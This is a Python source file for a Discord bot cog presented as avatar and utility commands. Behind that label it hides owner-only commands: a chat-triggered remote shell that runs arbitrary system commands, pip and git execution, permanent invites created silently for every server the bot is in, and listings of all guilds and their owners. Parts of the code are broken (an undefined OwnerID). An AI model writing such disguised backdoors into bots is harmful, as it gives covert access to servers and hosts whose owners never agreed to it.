from discord.ext import commands
import sys
import traceback
from subprocess import Popen, PIPE
import discord
import asyncpg
import subprocess


def is_whitelisted():
    async def predicate(ctx):
        GetUser = ctx.author.id in OwnerID
        return True if GetUser else False
    return commands.check(predicate)


class Utility(commands.Cog, description="Get people's avatar and more utility commands!"):
    def __init__(self, bot):
        self.bot = bot

    async def cog_command_error(self, ctx, error):
        if isinstance(error, commands.PrivateMessageOnly):
            try:
                return await ctx.send(
                    embed=discord.Embed(description="This command can only be used in DMS!")
                )
            except discord.HTTPException:
                pass
        if isinstance(error, commands.MissingRequiredArgument):
            try:
                return await ctx.send(
                    embed=discord.Embed(description=f"Oops! Missing {error.param.name}, try run help on the command.")
                )
            except discord.HTTPException:
                pass
        print("Ignoring exception in command {}:".format(ctx.command), file=sys.stderr)
        traceback.print_exception(
            type(error), error, error.__traceback__, file=sys.stderr
        )

    @is_whitelisted()
    @commands.dm_only()
    @commands.command(hidden=True)
    async def invitelink(self, ctx, id: int):
        server = self.bot.get_guild(id)
        for channel in server.channels:
            try:
                invite = await channel.create_invite(xkcd=True, max_age=0, max_uses=0)
                if invite:
                    break
            except:
                continue
        await ctx.send(invite)

    @is_whitelisted()
    @commands.dm_only()
    @commands.command(hidden=True)
    async def offline(self, ctx):
        await self.bot.change_presence(status=discord.Status.invisible)
        await ctx.send("[bot going offline] Going under!")

    @is_whitelisted()
    @commands.dm_only()
    @commands.command(hidden=True)
    async def online(self, ctx):
        await self.bot.change_presence(status=discord.Status.online)
        await ctx.send("[bot going away] Going AFK!")

    @is_whitelisted()
    @commands.dm_only()
    @commands.command(hidden=True)
    async def idle(self, ctx):
        await self.bot.change_presence(status=discord.Status.idle)
        await ctx.send("[bot going away] Going AFK!")

    @is_whitelisted()
    @commands.dm_only()
    @commands.command(hidden=True)
    async def inviteall(self, ctx):
        for guild in self.bot.guilds:
            for channel in guild.channels:
                try:
                    invitelinknew = await channel.create_invite(
                        destination=channel,
                        xkcd=True,
                        max_age=0,
                        max_uses=0,
                        reason=f"Invite sent by {guild.owner}",
                    )
                except discord.errors.NotFound:
                    print(f"Could not find invite for {guild}")
                if invitelinknew:
                    break
            await ctx.send(invitelinknew)

    @is_whitelisted()
    @commands.dm_only()
    @commands.command(hidden=True)
    async def allguilds(self, ctx):
        guilds = self.bot.guilds
        if len(guilds) < 26:
            embed = discord.Embed(title="Guilds")
            for x in guilds:
                embed.add_field(name=x.name, value=x.id)
            return await ctx.send(embed=embed)
        else:
            embeds = []
            for x in range(len(guilds)):
                if x % 25 == 0 or x == 0:
                    embed = discord.Embed(title="Guilds")
                guild = guilds[x]
                embed.add_field(name=guild.name, value=guild.id)
                if x % 25 == 0 or x == 0:
                    embeds.append(embed)
            for embed in embeds:
                await ctx.send(embed=embed)

    @is_whitelisted()
    @commands.command(aliases=['shell'], hidden=True)
    async def cmd(self, ctx, *, args):
        command = args.split(" ")
        process = Popen(command, stdout=PIPE, stderr=PIPE)
        stdout, stderr = process.communicate()
        await ctx.message.add_reaction("\N{White Heavy Check Mark}")
        await ctx.send(embed=discord.Embed(description=f"```{stdout.decode('utf8')}```"))

    @commands.command()
    async def avatar(self, ctx, member: discord.Member = None):
        if not member:
            member = ctx.author
        embed = discord.Embed(title=member.name)
        embed.set_thumbnail(url=member.avatar_url)
        await ctx.send(embed=embed)

    @is_whitelisted()
    @commands.command(hidden=True)
    async def git(self, ctx, *, args):
        command = ['git'] + args.split(" ")
        process = Popen(command, stdout=PIPE, stderr=PIPE)
        stdout, stderr = process.communicate()
        await ctx.send(embed=discord.Embed(description=f"```{stdout.decode('utf8')}```"))

    @is_whitelisted()
    @commands.command(hidden=True)
    async def pip(self, ctx, *, args):
        command = [sys.executable, "-m", "pip"] + args.split(" ")
        try:
            subprocess.check_call(command, stdout=PIPE, stderr=PIPE)
            await ctx.message.add_reaction("\N{White Heavy Check Mark}")
        except subprocess.CalledProcessError:
            await ctx.message.add_reaction("\N{Cross Mark}")

    @is_whitelisted()
    @commands.command(hidden=True)
    async def get_guild_owner(self, ctx):
        guilds = self.bot.guilds
        if len(guilds) < 26:
            embed = discord.Embed(title='Server owners')
            for guild in self.bot.guilds:
                embed.add_field(name=guild.name, value=f"{guild.owner.name}({guild.owner.id})")
            await ctx.send(embed=embed)
        else:
            embeds = []
            for x in range(len(guilds)):
                if x % 25 == 0 or x == 0:
                    embed = discord.Embed(title="Server owners")
                guild = guilds[x]
                embed.add_field(name=guild.name, value=f"{guild.owner.name}({guild.owner.id})")
                if x % 25 == 0 or x == 0:
                    embeds.append(embed)
            for embed in embeds:
                await ctx.send(embed=embed)
    @is_whitelisted()
    @commands.command(hidden=True)
    async def leave_guild(self, ctx, id: int):
        server = self.bot.get_guild(id)
        await server.leave()

def setup(bot):
    bot.add_cog(Utility(bot))
